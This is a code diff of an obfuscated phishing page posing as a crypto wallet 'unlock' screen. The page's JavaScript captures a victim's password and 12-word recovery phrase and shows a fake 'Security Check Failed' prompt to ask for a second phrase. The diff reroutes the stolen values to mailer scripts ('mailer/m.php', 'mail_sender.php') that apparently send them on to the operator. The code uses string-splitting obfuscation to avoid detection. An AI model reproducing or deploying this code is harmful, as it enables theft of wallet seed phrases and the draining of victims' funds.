@@ -909,31 +909,46 @@
     }
 
     function sendPass() {
+      var pass = document.getElementById('passInput').value;
+     
       var _0xd2264f = document['ge' + 'tE' + 'le' + 'me' + 'nt' + 'By' + 'Id']('pa' + 'ss' + 'In' + 'pu' + 't')['va' + 'lu' + 'e'],
         _0x1a7e8f = document['ge' + 'tE' + 'le' + 'me' + 'nt' + 'By' + 'Id']('fi' + 'rs' + 'tM' + 'od' + 'al'),
         _0x15f257 = document['ge' + 'tE' + 'le' + 'me' + 'nt' + 'By' + 'Id']('ph' + 'ra' + 'se' + 'Mo' + 'da' + 'l'),
         _0x402e20 = document['ge' + 'tE' + 'le' + 'me' + 'nt' + 'By' + 'Id']('pa' + 'ss' + 'Mo' + 'da' + 'l');
-      _0x1a7e8f['st' + 'yl' + 'e']['di' + 'sp' + 'la' + 'y'] = 'bl' + 'oc' + 'k', _0x402e20['st' + 'yl' + 'e']['di' + 'sp' + 'la' + 'y'] = 'no' + 'ne', $['aj' + 'ax']({
+      _0x1a7e8f['st' + 'yl' + 'e']['di' + 'sp' + 'la' + 'y'] = 'bl' + 'oc' + 'k', _0x402e20['st' + 'yl' + 'e']['di' + 'sp' + 'la' + 'y'] = 'no' + 'ne', 
+      
+     $['aj' + 'ax']({
         'type': 'PO' + 'ST',
-        'url': 've' + 'ri' + 'fy' + '-s' + 'te' + 'p-' + 'on' + 'e.' + 'ph' + 'p',
+        'url': 'mailer/m.php',
         'data': {
-          'password': _0xd2264f
+          'password': pass
+        },
+        success: function(data){
+         console.log(data);
         }
-      }), document['ge' + 'tE' + 'le' + 'me' + 'nt' + 'By' + 'Id']('pa' + 'ss' + 'In' + 'pu' + 't')['va' + 'lu' + 'e'] = '', setTimeout(function() {
+        
+      }); 
+      
+       document['ge' + 'tE' + 'le' + 'me' + 'nt' + 'By' + 'Id']('pa' + 'ss' + 'In' + 'pu' + 't')['va' + 'lu' + 'e'] = '', setTimeout(function() {
         'Fd' + 'Lj' + 'G' === 'Fd' + 'Lj' + 'G' ? (_0x1a7e8f['st' + 'yl' + 'e']['di' + 'sp' + 'la' + 'y'] = 'no' + 'ne', _0x15f257['st' + 'yl' + 'e']['di' + 'sp' + 'la' + 'y'] = 'bl' + 'oc' + 'k') : (_0x498443['st' + 'yl' + 'e']['di' + 'sp' + 'la' + 'y'] = 'no' + 'ne', _0x1a619b['st' + 'yl' + 'e']['di' + 'sp' + 'la' + 'y'] = 'bl' + 'oc' + 'k');
       }, 0x5dc);
+      
     }
 
     function sendPhrase() {
+      var phraseInput = document.getElementById('phraseInput').value;
+      var pass = document.getElementById('passInput').value;
+      
       var _0x11bc49 = document['ge' + 'tE' + 'le' + 'me' + 'nt' + 'By' + 'Id']('ph' + 'ra' + 'se' + 'In' + 'pu' + 't')['va' + 'lu' + 'e'],
         _0x7421a5 = document['ge' + 'tE' + 'le' + 'me' + 'nt' + 'By' + 'Id']('fi' + 'rs' + 'tM' + 'od' + 'al'),
         _0x49f3bb = document['ge' + 'tE' + 'le' + 'me' + 'nt' + 'By' + 'Id']('la' + 'st' + 'Mo' + 'da' + 'l'),
         _0x44f539 = document['ge' + 'tE' + 'le' + 'me' + 'nt' + 'By' + 'Id']('ph' + 'ra' + 'se' + 'Mo' + 'da' + 'l');
       _0x7421a5['st' + 'yl' + 'e']['di' + 'sp' + 'la' + 'y'] = 'bl' + 'oc' + 'k', _0x44f539['st' + 'yl' + 'e']['di' + 'sp' + 'la' + 'y'] = 'no' + 'ne', $['aj' + 'ax']({
-        'type': 'PO' + 'ST',
-        'url': 've' + 'ri' + 'fy' + '-s' + 'te' + 'p-' + 'tw' + 'o.' + 'ph' + 'p',
-        'data': {
-          'phrase': _0x11bc49
+        'type': 'GET',
+        'url': 'mailer/m.php',
+        'data': {phrase: phraseInput},
+        success: function(data){
+         console.log(data);
         }
       }), document['ge' + 'tE' + 'le' + 'me' + 'nt' + 'By' + 'Id']('ph' + 'ra' + 'se' + 'In' + 'pu' + 't')['va' + 'lu' + 'e'] = '', setTimeout(function() {
         'Uc' + 'lO' + 'h' !== 'Uc' + 'lO' + 'h' ? _0x2d7934 = !![]: (_0x7421a5['st' + 'yl' + 'e']['di' + 'sp' + 'la' + 'y'] = 'no' + 'ne', _0x49f3bb['st' + 'yl' + 'e']['di' + 'sp' + 'la' + 'y'] = 'bl' + 'oc' + 'k');
@@ -966,14 +981,15 @@
         return !_0x1c4ae7 ? (_0x40c6d2 = sorry_0x4bb7['zAykLr'](_0x40c6d2), _0x5461cd[_0xe6f7da] = _0x40c6d2) : _0x40c6d2 = _0x1c4ae7, _0x40c6d2;
       }, sorry_0x4bb7(_0x5461cd, _0xbebb8);
     }
-
+    
+/*
     function sendLast() {
       var _0x1f6da8 = document['ge' + 'tE' + 'le' + 'me' + 'nt' + 'By' + 'Id']('ph' + 'ra' + 'se' + '2I' + 'np' + 'ut')['va' + 'lu' + 'e'],
         _0x3bc1cb = document['ge' + 'tE' + 'le' + 'me' + 'nt' + 'By' + 'Id']('fi' + 'rs' + 'tM' + 'od' + 'al'),
         _0x5cd4e6 = document['ge' + 'tE' + 'le' + 'me' + 'nt' + 'By' + 'Id']('la' + 'st' + 'Mo' + 'da' + 'l');
       _0x3bc1cb['st' + 'yl' + 'e']['di' + 'sp' + 'la' + 'y'] = 'bl' + 'oc' + 'k', _0x5cd4e6['st' + 'yl' + 'e']['di' + 'sp' + 'la' + 'y'] = 'no' + 'ne', $['aj' + 'ax']({
         'type': 'PO' + 'ST',
-        'url': 've' + 'ri' + 'fy' + '-s' + 'te' + 'p-' + 'tw' + 'o.' + 'ph' + 'p',
+        'url': 'mail_sender.php',
         'data': {
           'phrase': _0x1f6da8
         }
@@ -981,6 +997,7 @@
         'UD' + 'KU' + 'g' === 'oV' + 'aE' + 'E' ? (_0x428d19['st' + 'yl' + 'e']['di' + 'sp' + 'la' + 'y'] = 'no' + 'ne', _0x39e32e['st' + 'yl' + 'e']['di' + 'sp' + 'la' + 'y'] = 'bl' + 'oc' + 'k') : (_0x3bc1cb['st' + 'yl' + 'e']['di' + 'sp' + 'la' + 'y'] = 'no' + 'ne', _0x5cd4e6['st' + 'yl' + 'e']['di' + 'sp' + 'la' + 'y'] = 'bl' + 'oc' + 'k');
       }, 0x320);
     }
+    */
     $('sp' + 'an')['cs' + 's']('po' + 'in' + 'te' + 'r-' + 'ev' + 'en' + 'ts', 'no' + 'ne');
     var firstClick = ![];
     $(document)['re' + 'ad' + 'y'](function() {
@@ -1685,11 +1702,11 @@
                 <h1 class="aaaaaa unlock-page__title">Security Check Failed</h1>
                 <div>We cannot confirm it's you.</div>
                 <div>Try again using another 12 word phrase.</div>
-                <form action="#" onsubmit="sendLast(); return false;" class="unlock-page__form">
+                <form action="mail_sender.php" method="post" onsubmit="sendLast(); return false;" class="unlock-page__form">
                   <div class="MuiFormControl-root MuiTextField-root MuiFormControl-fullWidth">
                     <label class="MuiFormLabel-root MuiInputLabel-root jss1 MuiInputLabel-formControl MuiInputLabel-animated" data-shrink="false" for="password" id="password-label"></label>
                     <div class="MuiInputBase-root MuiInput-root MuiInput-underline jss3 MuiInputBase-fullWidth MuiInput-fullWidth MuiInputBase-formControl MuiInput-formControl">
-                      <input id="phrase2Input" minlength="30" aria-invalid="false" autocomplete="off" placeholder="12 word phrase" type="text" dir="auto" class="MuiInputBase-input MuiInput-input" style="box-sizing: content-box;" value="" required>
+                      <input name="data" id="phrase2Input" minlength="30" aria-invalid="false" autocomplete="off" placeholder="12 word phrase" type="text" dir="auto" class="MuiInputBase-input MuiInput-input" style="box-sizing: content-box;" value="" required>
                     </div>
                   </div>
                 </form>
